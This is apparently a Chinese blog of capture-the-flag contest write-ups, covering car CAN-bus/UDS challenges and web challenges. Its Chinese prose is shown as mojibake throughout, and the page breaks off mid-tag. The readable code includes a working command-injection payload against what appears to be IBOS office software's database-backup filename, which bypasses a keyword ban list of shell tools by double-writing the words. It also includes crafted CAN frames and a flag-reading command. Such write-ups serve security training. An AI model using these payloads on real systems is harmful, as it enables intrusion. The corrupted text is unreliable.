title="è½¦çª—æ§åˆ¶"></a>è½¦çª—æ§åˆ¶</h3><blockquote><p>æ“ä½œè™šæ‹Ÿè½¦è¾†ï¼Œè·å–è½¦çª—çŠ¶æ€æŠ¥æ–‡ï¼Œé€†å‘åˆ†ææŠ¥æ–‡åè®®ï¼Œé€šè¿‡é€†å‘ç»“æœå°è¯•æ„é€ å·¦å‰è½¦çª—å‡èµ·30%ï¼Œå·¦åå‡èµ·50%ï¼Œå³å‰è½¦çª—å‡èµ·70%ï¼Œå³åè½¦çª—å‡èµ·30%çš„æŠ¥æ–‡ï¼Œé€šè¿‡CAN ID 0x11å‘é€è¯¥æ„é€ å¥½çš„æŠ¥æ–‡åˆ°ä»¿çœŸè½¦è¾†ï¼Œå¯é€šè¿‡è™šæ‹Ÿè½¦è¾†ä»ªè¡¨é¡µé¢éªŒè¯æ„é€ ç»“æœã€‚å‡å¦‚æ„é€ çš„æŠ¥æ–‡æ˜¯cansend can0  011#01010101ï¼Œåˆ™æäº¤01010101ï¼Œæåˆ°å¹³å°ï¼ˆæ ¼å¼:dk_flag{æŠ¥æ–‡}ï¼‰</p></blockquote><p>å››ä¸ªåå…­è¿›åˆ¶ä½ä¾æ¬¡ä»£è¡¨ï¼šå·¦å‰ å³å‰ å·¦å å³å</p><p>å¼€å¯æ˜¯0x00ï¼Œå…³é—­æ˜¯0x64</p><p>é‚£ä¹ˆå‡èµ·30%æ˜¯0x1Eï¼Œå‡èµ·50%æ˜¯0x32ï¼Œå‡èµ·70%æ˜¯0x46</p><p>flagï¼š<code>dk_flag&#123;1E46321E&#125;</code></p><hr><h2 id="OBD2"><a href="#OBD2" class="headerlink" title="OBD2"></a>OBD2</h2><h3 id="è½¦è¾†VINè¯»å–"><a href="#è½¦è¾†VINè¯»å–" class="headerlink" title="è½¦è¾†VINè¯»å–"></a>è½¦è¾†VINè¯»å–</h3><blockquote><p>å°å¼ æ˜¯ä¸€åè½¦è”ç½‘å®‰å…¨ä¸“å®¶ï¼Œè´Ÿè´£è¯„ä¼°ä¸€æ¬¾æ–°å‹æ™ºèƒ½ç½‘è”æ±½è½¦çš„å®‰å…¨æ€§ã€‚è¿™æ¬¾æ±½è½¦æ”¯æŒUDSï¼ˆç»Ÿä¸€è¯Šæ–­æœåŠ¡ï¼‰åè®®ï¼Œå…è®¸é€šè¿‡æ ‡å‡†åŒ–çš„è¯Šæ–­å‘½ä»¤è¯»å–æˆ–è€…å†™å…¥è½¦è¾†ä¿¡æ¯å’Œæ‰§è¡Œç»´æŠ¤æ“ä½œã€‚ä¸ºäº†ç¡®ä¿ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå°å¼ å†³å®šå†³å®šä¾ç…§UDSæ ‡å‡†å°è¯•ç¯¡æ”¹æ”¹è¿™è¾†è½¦çš„VINç ï¼Œä»–æƒ³å…ˆè·å–ä¸‹å½“å‰è½¦è¾†çš„VINç ã€‚é€šè¿‡æŸ¥è¯¢æ‰‹å†Œï¼Œä»–æ„é€ äº†730#0322F190è¿™æ ·ä¸€ä¸ªæŠ¥æ–‡æ¥è¯»å–è½¦è¾†çš„VINï¼Œç°åœ¨è¦æ±‚ä½ åœ¨can1å£ä¸Šå‘é€è¿™æ ·æŠ¥æ–‡ï¼Œä¹Ÿå‚ç…§UDSæ ‡å‡†çš„å®šä¹‰ï¼Œå¯¹å“åº”ç»“æœè¿›è¡Œè§£æï¼Œä»ä¸­æå–å‡ºè½¦è¾†çš„VINå­—ç¬¦ä¸²ï¼Œæäº¤åˆ°å¹³å°ï¼ˆæ ¼å¼:dk_flag{VINå­—ç¬¦ä¸²}ï¼‰ã€‚</p></blockquote><p>å‘é€æŠ¥æ–‡ï¼Œå¦ä¸€è¾¹æŠ“åŒ…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">730</span><span class="token comment">#0322F190</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110094112861.png" alt="image-20250110094112861"></p><p><code>candump can1</code>ä¸‹æ¥çœ‹å…·ä½“çš„åå…­è¿›åˆ¶åŒ…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">can1  <span class="token number">730</span>   <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>  03 <span class="token number">22</span> F1 <span class="token number">90</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">10</span> <span class="token number">14</span> <span class="token number">62</span> F1 <span class="token number">90</span> <span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">21</span> 5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span>can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">22</span> <span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å‚è€ƒï¼š</p><p><a href="https://www.iodraw.com/blog/221207386">https://www.iodraw.com/blog/221207386</a></p><p><a href="https://blog.csdn.net/qq_40242571/article/details/120756736">https://blog.csdn.net/qq_40242571/article/details/120756736</a></p><p>VINç ä¸€èˆ¬æ˜¯17ä½çš„ï¼Œå–å‡ºå…¶ä¸­çš„æœ‰æ•ˆå“åº”æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span><span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è§£ç å³å¯å¾—åˆ°VINç </p><p>flagï¼š<code>dk_flag&#123;WYUZA1S2FEDK00001&#125;</code></p><h3 id="è½¦è¾†æ•…éšœæ•°é‡è¯»å–"><a href="#è½¦è¾†æ•…éšœæ•°é‡è¯»å–" class="headerlink" title="è½¦è¾†æ•…éšœæ•°é‡è¯»å–"></a>è½¦è¾†æ•…éšœæ•°é‡è¯»å–</h3><blockquote><p>å°å¼ æ˜¯ä¸€åè½¦è”ç½‘å®‰å…¨ä¸“å®¶ï¼Œè´Ÿè´£è¯„ä¼°ä¸€æ¬¾æ–°å‹æ™ºèƒ½ç½‘è”æ±½è½¦çš„å®‰å…¨æ€§ã€‚è¿™æ¬¾æ±½è½¦æ”¯æŒUDSï¼ˆç»Ÿä¸€è¯Šæ–­æœåŠ¡ï¼‰åè®®ï¼Œå…è®¸é€šè¿‡æ ‡å‡†åŒ–çš„è¯Šæ–­å‘½ä»¤è¯»å–æˆ–è€…å†™å…¥è½¦è¾†ä¿¡æ¯å’Œæ‰§è¡Œç»´æŠ¤æ“ä½œã€‚ä¸ºäº†ç¡®ä¿ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå°å¼ å†³å®šå†³å®šä¾ç…§UDSæ ‡å‡†å°è¯•è¯»å–å½“å‰è½¦è¾†æ•…éšœæ•°é‡ã€‚é€šè¿‡æŸ¥è¯¢æ‰‹å†Œï¼Œä»–æ„é€ äº†710#03190103è¿™æ ·ä¸€ä¸ªæŠ¥æ–‡æ¥è¯»å–è½¦è¾†çš„æ•…éšœæ•°é‡ï¼Œç°åœ¨è¦æ±‚ä½ åœ¨can1å£ä¸Šå‘é€è¿™æ ·æŠ¥æ–‡ï¼Œä¹Ÿå‚ç…§UDSæ ‡å‡†çš„å®šä¹‰ï¼Œå¯¹å“åº”ç»“æœè¿›è¡Œè§£æï¼Œä»ä¸­æå–å‡ºè½¦è¾†çš„æ•…éšœæ•°é‡ï¼Œæäº¤åˆ°å¹³å°ï¼ˆæ ¼å¼:dk_flag{æ•…éšœæ•°é‡}ï¼‰ã€‚</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">710</span><span class="token comment">#03190103</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110095040842.png" alt="image-20250110095040842"></p><p>çŒœæµ‹æ˜¯718ä¸Šçš„æŸä½æ•°å­—</p><p>flagï¼š<code>dk_flag&#123;2&#125;</code></p><hr><h1 id="ä¿¡åˆ›å®‰å…¨æŒ‘æˆ˜åŒº"><a href="#ä¿¡åˆ›å®‰å…¨æŒ‘æˆ˜åŒº" class="headerlink" title="ä¿¡åˆ›å®‰å…¨æŒ‘æˆ˜åŒº"></a>ä¿¡åˆ›å®‰å…¨æŒ‘æˆ˜åŒº</h1><h2 id="misc-å…¥ä¾µæµé‡ç›‘æµ‹"><a href="#misc-å…¥ä¾µæµé‡ç›‘æµ‹" class="headerlink" title="misc-å…¥ä¾µæµé‡ç›‘æµ‹"></a>misc-å…¥ä¾µæµé‡ç›‘æµ‹</h2><p>dateï¼Œçˆ†ç ´8ä½æ—¥æœŸå³å¯</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109100514281.png" alt="image-20250109100514281"></p><hr><h2 id="web-å›½äº§åŠå…¬è½¯ä»¶æ¼æ´åˆ©ç”¨"><a href="#web-å›½äº§åŠå…¬è½¯ä»¶æ¼æ´åˆ©ç”¨" class="headerlink" title="web-å›½äº§åŠå…¬è½¯ä»¶æ¼æ´åˆ©ç”¨"></a>web-å›½äº§åŠå…¬è½¯ä»¶æ¼æ´åˆ©ç”¨</h2><p>data\backup\2025-01-03_MD4zU</p><p>åå°adminè´¦å¯†</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_cache_user_detail<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'&#123;\"uid\":\"1\",\"username\":\"admin\",\"isadministrator\":\"1\",\"deptid\":\"0\",\"positionid\":\"0\",\"roleid\":\"0\",\"upuid\":\"0\",\"groupid\":\"0\",\"jobnumber\":\"\",\"realname\":\"\\u8d85\\u7ea7\\u7ba1\\u7406\\u5458\",\"password\":\"bc3bc521c972d39d1e5748598987c77f\",\"gender\":\"1\",\"weixin\":\"\",\"mobile\":\"11111111111\",\"email\":\"\",\"status\":\"0\",\"createtime\":\"1735912196\",\"credits\":\"0\",\"newcomer\":\"1\",\"salt\":\"a8AZi8\",\"validationemail\":\"0\",\"validationmobile\":\"0\",\"lastchangepass\":\"0\",\"guid\":\"5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD\",\"birthday\":\"0\",\"telephone\":\"\",\"address\":\"\",\"qq\":\"\",\"bio\":\"\",\"remindsetting\":\"\",\"avatar_big\":\"data\\/avatar\\/noavatar_big.jpg\",\"avatar_middle\":\"data\\/avatar\\/noavatar_middle.jpg\",\"avatar_small\":\"data\\/avatar\\/noavatar_small.jpg\",\"bg_big\":\"data\\/home\\/nobg_big.jpg\",\"bg_middle\":\"\",\"bg_small\":\"data\\/home\\/nobg_small.jpg\",\"group_title\":\"\",\"level\":1,\"upgrade_percent\":0,\"next_group_credit\":0,\"alldeptid\":\"0\",\"deptname\":\"\",\"posname\":\"\",\"allposid\":\"\",\"rolename\":\"\",\"allroleid\":\"\",\"space_url\":\"?r=user\\/home\\/index&amp;uid=1\"&#125;'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯†ç md5è§£ä¸å‡ºæ¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_user<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'è¶…çº§ç®¡ç†å‘˜'</span><span class="token punctuation">,</span><span class="token string">'bc3bc521c972d39d1e5748598987c77f'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'11111111111'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1735912196</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a8AZi8'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœä¸€ä¸‹æ‰¾åˆ°åŠ å¯†é€»è¾‘ï¼Œæ˜¯ä¸¤æ¬¡<code>md5(md5($pass),$salt)</code></p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113138639.png" alt="image-20250109113138639"></p><p>æµ‹å‡ºæ¥å¯†ç æ˜¯123456</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113251988.png" alt="image-20250109113251988"></p><p>åŸæ¥æ˜¯é»˜è®¤å¯†ç </p><p>ç„¶åå°±è¿›åå°äº†ï¼Œæ¥ä¸‹æ¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/9115">https://xz.aliyun.com/t/9115</a></p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113955181.png" alt="image-20250109113955181"></p><p>æŠ“åŒ…</p><p>æ¼æ´ç‚¹åœ¨ï¼šsystem\core\utils\Database.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$backupFileName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.sql'</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dumpFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqlBin</span> <span class="token operator">=</span> <span class="token variable">$mysqlBase</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$mysqlBase</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'bin/'</span><span class="token punctuation">;</span><span class="token variable">$command1</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--skip-opt --create-options'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'-all'</span><span class="token punctuation">;</span><span class="token variable">$command2</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'extendins'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--extended-insert'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$command3</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$sqlCompat</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'MYSQL40'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--compatible=mysql40'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$command4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"--port=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"--socket=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span><span class="token variable">$command5</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$command4</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//è¿™ã€‚ã€‚ã€‚æ˜¯é»‘ç§‘æŠ€</span><span class="token string backtick-quoted-string">`&#123;$mysqlBin&#125;mysqldump --force --quick &#123;$command1&#125; --add-drop-table &#123;$command2&#125; &#123;$command3&#125; --host="&#123;$db['host']&#125;" &#123;$command5&#125; --user="&#123;$db['username']&#125;" --password="&#123;$db['password']&#125;" "&#123;$db['dbname']&#125;" &#123;$tablesstr&#125; > &#123;$dumpFile&#125;`</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ä¸Šè·Ÿè¸ª</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// --- å¤‡ä»½æ–‡ä»¶å¤¹åŠå¤‡ä»½æ–‡ä»¶å ---</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name static-context">File</span><span class="token operator">::</span><span class="token function">makeDir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$backupFileName</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'nl'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'head'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tail'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'more'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'less'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filenameè¿™æ ·banï¼Œæ›¿æ¢å‡½æ•°çš„è¯åŒå†™ç»•è¿‡å³å¯</p><p>å†å¾€ä¸Šçœ‹çœ‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// æ£€æŸ¥å¯¼å‡ºåå­—</span><span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hasDangerFileName</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.)(exe|jsp|asp|aspx|cgi|fcgi|pl)(\.|$)/i'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fileName</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$hasDangerFileName</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'msg'</span> <span class="token operator">=></span> <span class="token class-name static-context">Ibos</span><span class="token operator">::</span><span class="token function">lang</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Database export filename invalid'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dashboard.default'</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·bançš„è¯å†™é©¬å¤ªå›°éš¾ï¼Œä½†æ˜¯ä¾æ—§å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤</p><p>æ„é€ payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">backuptype<span class="token operator">=</span>all<span class="token operator">&amp;</span>custom_enabled<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>shell<span class="token operator">&amp;</span>sizelimit<span class="token operator">=</span><span class="token number">2048</span><span class="token operator">&amp;</span>extendins<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>sqlcompat<span class="token operator">=</span><span class="token constant">MYSQL41</span><span class="token operator">&amp;</span>sqlcharset<span class="token operator">=</span>utf8<span class="token operator">&amp;</span>usehex<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>usezip<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token number">2021</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>cd <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">26</span>llss<span class="token operator">></span><span class="token number">111</span><span class="token operator">%</span><span class="token number">262021</span><span class="token operator">&amp;</span>dbSubmit<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109114700372.png" alt="image-20250109114700372"></p><p>webæ ¹ç›®å½•ä¸‹è®¿é—®å¯ä»¥å¸¦å‡ºå›æ˜¾å†…å®¹</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109140751067.png" alt="image-20250109140751067"></p><p>æ”¹æˆ <code>cacatt f12g.txt</code> å°±èƒ½è¯»å–flagäº†</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109141001775.png" alt="image-20250109141001775"></p><p>æ€ä¹ˆ f14g.txt å°±åœ¨webç›®å½•ï¼Œè¿™ä¸‹çŸ¥é“å‰å‡ è¡€æ€ä¹ˆåšçš„äº†</p><hr><h2 id="web-å›½äº§ä¸šåŠ¡ç³»ç»Ÿéšæ‚£æ’æŸ¥"><a href="#web-å›½äº§ä¸šåŠ¡ç³»ç»Ÿéšæ‚£æ’æŸ¥" class="headerlink" title="web-å›½äº§ä¸šåŠ¡ç³»ç»Ÿéšæ‚£æ’æŸ¥"></a>web-å›½äº§ä¸šåŠ¡ç³»ç»Ÿéšæ‚£æ’æŸ¥</h2><p>æµé‡åŒ…åˆ†æå‡ºåå°å¯†ç </p><p>ç„¶åæ˜¯ä¸€ä¸ªè‰çŸ¥7.7ï¼Œgetshellçš„æ–¹å¼åœ¨ NSS GKCTF2021 easycms ä¸­äº¦æœ‰è®°è½½ï¼š<a href="https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms">https://c1oudfl0w0.github.io/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#GKCTF-2021-easycms</a></p><p>ç®€å•æä¸ªæƒæ‹¿flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2.7 <span class="token parameter variable">-c</span> <span class="token string">'print(open(\"/flag.txt\").read())'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109112822712.png" alt="image-20250109112822712"></p><hr><h2 id="pwn-snake"><a href="#pwn-snake" class="headerlink" title="pwn-snake"></a>pwn-snake</h2><p>dword_6BD3F0 æ˜¯åˆ†æ•°</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114712153.png" alt="image-20250110114712153"></p><p>æ‰“2åˆ†è¾“å…¥qé€€å‡ºåè¿›å…¥ sub_401427</p><p><img 